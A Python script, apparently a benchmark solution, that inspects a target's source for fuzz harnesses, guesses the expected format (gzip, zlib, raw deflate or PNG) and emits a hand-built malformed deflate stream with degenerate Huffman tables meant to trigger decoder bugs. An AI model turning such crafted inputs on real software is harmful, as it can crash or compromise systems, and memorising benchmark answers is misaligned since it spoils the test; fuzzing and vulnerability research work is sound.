import os
import re
import tarfile
import binascii
import zlib
from typing import Iterator, Tuple, Optional


class _BitWriter:
    __slots__ = ("_buf", "_acc", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._acc = 0
        self._nbits = 0

    def write_bits(self, value: int, nbits: int) -> None:
        acc = self._acc
        nb = self._nbits
        for i in range(nbits):
            bit = (value >> i) & 1
            acc |= bit << nb
            nb += 1
            if nb == 8:
                self._buf.append(acc & 0xFF)
                acc = 0
                nb = 0
        self._acc = acc
        self._nbits = nb

    def finish(self) -> bytes:
        if self._nbits:
            self._buf.append(self._acc & 0xFF)
            self._acc = 0
            self._nbits = 0
        return bytes(self._buf)


def _build_deflate_dynamic_zero_literals(n_zeros: int) -> bytes:
    bw = _BitWriter()
    # BFINAL=1, BTYPE=2 (dynamic)
    bw.write_bits(1, 1)
    bw.write_bits(2, 2)
    # HLIT=0 (257 lit/len codes)
    bw.write_bits(0, 5)
    # HDIST=1 (2 dist codes)
    bw.write_bits(1, 5)
    # HCLEN=1 (5 code length codes)
    bw.write_bits(1, 4)

    # Code length code lengths for symbols in order: [16,17,18,0,8]
    # Set: 18->1, 8->2, others->0
    bw.write_bits(0, 3)  # 16
    bw.write_bits(0, 3)  # 17
    bw.write_bits(1, 3)  # 18
    bw.write_bits(0, 3)  # 0
    bw.write_bits(2, 3)  # 8

    # Code length Huffman codes (canonical) with lengths: 18:1, 8:2
    # => 18 code: 0 (1 bit)
    # => 8 code: 10 (2 bits), sent LSB-first => bits [0,1] => value 2, 2 bits
    def emit_cl_sym8():
        bw.write_bits(2, 2)

    def emit_cl_sym18_repeat_zeros(count: int):
        # Symbol 18 with 7 extra bits: count = 11..138
        bw.write_bits(0, 1)
        bw.write_bits(count - 11, 7)

    # Lit/Len lengths: symbol0=8, symbol1..255=0 (255 zeros), symbol256=8
    # Dist lengths: symbol0=8, symbol1=8
    emit_cl_sym8()  # sym0 length 8
    emit_cl_sym18_repeat_zeros(138)
    emit_cl_sym18_repeat_zeros(117)  # 138+117=255 zeros
    emit_cl_sym8()  # sym256 length 8
    emit_cl_sym8()  # dist0 length 8
    emit_cl_sym8()  # dist1 length 8

    # Data using lit/len tree with only symbols 0 and 256, both length 8:
    # canonical => sym0 code 0x00, sym256 code 0x01; sent LSB-first.
    for _ in range(n_zeros):
        bw.write_bits(0, 8)  # literal 0
    bw.write_bits(1, 8)  # EOB (sym256)
    return bw.finish()


def _wrap_gzip(deflate_stream: bytes, out_data: bytes) -> bytes:
    hdr = bytes([0x1F, 0x8B, 0x08, 0x00]) + b"\x00\x00\x00\x00" + bytes([0x00, 0x03])
    crc = binascii.crc32(out_data) & 0xFFFFFFFF
    isize = len(out_data) & 0xFFFFFFFF
    trailer = crc.to_bytes(4, "little") + isize.to_bytes(4, "little")
    return hdr + deflate_stream + trailer


def _wrap_zlib(deflate_stream: bytes, out_data: bytes) -> bytes:
    # CMF=0x78 (32K window, deflate), FLG=0x01 to make header divisible by 31
    hdr = b"\x78\x01"
    ad = zlib.adler32(out_data) & 0xFFFFFFFF
    trailer = ad.to_bytes(4, "big")
    return hdr + deflate_stream + trailer


def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    ln = len(data).to_bytes(4, "big")
    crc = (binascii.crc32(ctype + data) & 0xFFFFFFFF).to_bytes(4, "big")
    return ln + ctype + data + crc


def _wrap_png(zlib_stream: bytes) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    # 1x1, 8-bit, truecolor (RGB), deflate, no filter, no interlace
    ihdr = (1).to_bytes(4, "big") + (1).to_bytes(4, "big") + bytes([8, 2, 0, 0, 0])
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", zlib_stream) + _png_chunk(b"IEND", b"")


def _iter_texts_from_src(src_path: str, max_files: int = 400, max_bytes_per_file: int = 1_000_000) -> Iterator[Tuple[str, str]]:
    def to_text(b: bytes) -> str:
        return b.decode("latin-1", errors="ignore")

    if os.path.isdir(src_path):
        count = 0
        for root, _, files in os.walk(src_path):
            for fn in files:
                if count >= max_files:
                    return
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0:
                    continue
                if st.st_size > max_bytes_per_file:
                    continue
                low = fn.lower()
                if not (low.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".S", ".s")) or
                        any(k in low for k in ("fuzz", "harness", "test", "example", "main"))):
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read(max_bytes_per_file)
                except OSError:
                    continue
                count += 1
                yield path, to_text(data)
        return

    if tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                count = 0
                for m in tf:
                    if count >= max_files:
                        return
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > max_bytes_per_file:
                        continue
                    name = m.name
                    low = name.lower()
                    if not (low.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".S", ".s")) or
                            any(k in low for k in ("fuzz", "harness", "test", "example", "main"))):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(max_bytes_per_file)
                    except Exception:
                        continue
                    count += 1
                    yield name, to_text(data)
        except Exception:
            return


def _detect_expected_format(src_path: str) -> str:
    # Returns one of: "gzip", "zlib", "deflate", "png"
    texts = []
    for name, txt in _iter_texts_from_src(src_path):
        texts.append((name, txt))
        if len(texts) >= 200:
            break

    # Prioritize explicit fuzzer harnesses
    harness_candidates = []
    for name, txt in texts:
        if "LLVMFuzzerTestOneInput" in txt or re.search(r"\bmain\s*\(", txt):
            harness_candidates.append((name, txt))

    def score_text(txt: str) -> Tuple[int, int, int, int]:
        t = txt
        png = 0
        gz = 0
        zl = 0
        raw = 0

        if ("\\x89PNG\\r\\n\\x1a\\n" in t) or ("IHDR" in t and "IDAT" in t) or ("upng_decode" in t) or ("upng_new_from_bytes" in t):
            png += 5
        if re.search(r"\bPNG\b", t) and ("IHDR" in t or "upng_" in t):
            png += 2

        if ("gzip" in t.lower()) or ("gunzip" in t.lower()) or ("GZIP" in t) or ("gz" in t.lower() and "inflate" in t.lower()):
            gz += 3
        if ("0x1f" in t.lower() and "0x8b" in t.lower()) or ("1f 8b" in t.lower()) or ("GZIP_MAGIC" in t):
            gz += 5

        if ("adler32" in t.lower()) or ("zlib" in t.lower()) or ("CMF" in t and "FLG" in t):
            zl += 3
        if re.search(r"\buncompress\s*\(", t) or re.search(r"\binflateInit\b", t):
            zl += 2

        if re.search(r"\binflate\s*\(", t) and ("gzip" not in t.lower()) and ("zlib" not in t.lower()):
            raw += 1
        if "wbits=-15" in t:
            raw += 5

        return png, gz, zl, raw

    if harness_candidates:
        best = ("gzip", -1)
        for _, txt in harness_candidates:
            png, gz, zl, raw = score_text(txt)
            if png >= 5:
                return "png"
            if gz >= 5:
                return "gzip"
            if zl >= 3 and gz == 0:
                best = ("zlib", max(best[1], zl))
            if raw >= 5:
                best = ("deflate", max(best[1], raw))
        if best[1] >= 0:
            return best[0]

    # Global scoring
    agg = [0, 0, 0, 0]  # png, gzip, zlib, deflate
    for _, txt in texts:
        png, gz, zl, raw = score_text(txt)
        agg[0] += png
        agg[1] += gz
        agg[2] += zl
        agg[3] += raw

    if agg[0] >= max(agg[1], agg[2], agg[3]) and agg[0] >= 6:
        return "png"
    if agg[1] >= max(agg[2], agg[3]) and agg[1] >= 4:
        return "gzip"
    if agg[2] >= agg[3] and agg[2] >= 3:
        return "zlib"
    if agg[3] >= 4:
        return "deflate"
    return "gzip"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_expected_format(src_path)

        if fmt == "png":
            out = b"\x00\x00\x00\x00"  # filter 0 + RGB(0,0,0) for 1x1 truecolor
            deflate_stream = _build_deflate_dynamic_zero_literals(4)
            # Validate if possible
            try:
                if zlib.decompress(deflate_stream, wbits=-15) != out:
                    deflate_stream = _build_deflate_dynamic_zero_literals(4)
            except Exception:
                pass
            zstream = _wrap_zlib(deflate_stream, out)
            return _wrap_png(zstream)

        if fmt == "deflate":
            out = b""
            deflate_stream = _build_deflate_dynamic_zero_literals(0)
            try:
                if zlib.decompress(deflate_stream, wbits=-15) != out:
                    deflate_stream = _build_deflate_dynamic_zero_literals(0)
            except Exception:
                pass
            return deflate_stream

        if fmt == "zlib":
            out = b""
            deflate_stream = _build_deflate_dynamic_zero_literals(0)
            try:
                if zlib.decompress(deflate_stream, wbits=-15) != out:
                    deflate_stream = _build_deflate_dynamic_zero_literals(0)
            except Exception:
                pass
            return _wrap_zlib(deflate_stream, out)

        # gzip default
        out = b""
        deflate_stream = _build_deflate_dynamic_zero_literals(0)
        try:
            if zlib.decompress(deflate_stream, wbits=-15) != out:
                deflate_stream = _build_deflate_dynamic_zero_literals(0)
        except Exception:
            pass
        gz = _wrap_gzip(deflate_stream, out)
        try:
            if zlib.decompress(gz, wbits=31) != out:
                gz = _wrap_gzip(deflate_stream, out)
        except Exception:
            pass
        return gz